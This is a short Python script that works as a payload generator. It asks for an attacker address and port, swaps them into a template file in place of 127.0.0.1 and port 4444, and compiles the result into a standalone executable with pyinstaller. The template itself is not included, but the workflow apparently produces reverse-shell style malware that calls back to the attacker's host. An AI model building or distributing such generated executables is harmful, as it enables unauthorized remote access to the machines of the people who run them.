from random import randint
import subprocess as sp
from os import system

def generate():

    addr = input("Address: ")
    port = int(input("Port: "))

    gename = f"generated{randint(100000, 9999999999)}.py"

    with open("template.py", "r") as file:
        payload = file.read().replace("127.0.0.1", addr).replace("4444", str(port))

    with open(gename, "w") as g:
        g.write(payload)

    file.close()
    g.close()

    print("Compiling...")
    system(f"pyinstaller --noconfirm --onefile --console {gename}")
    print("Doine!")


if __name__ == "__main__":
    generate()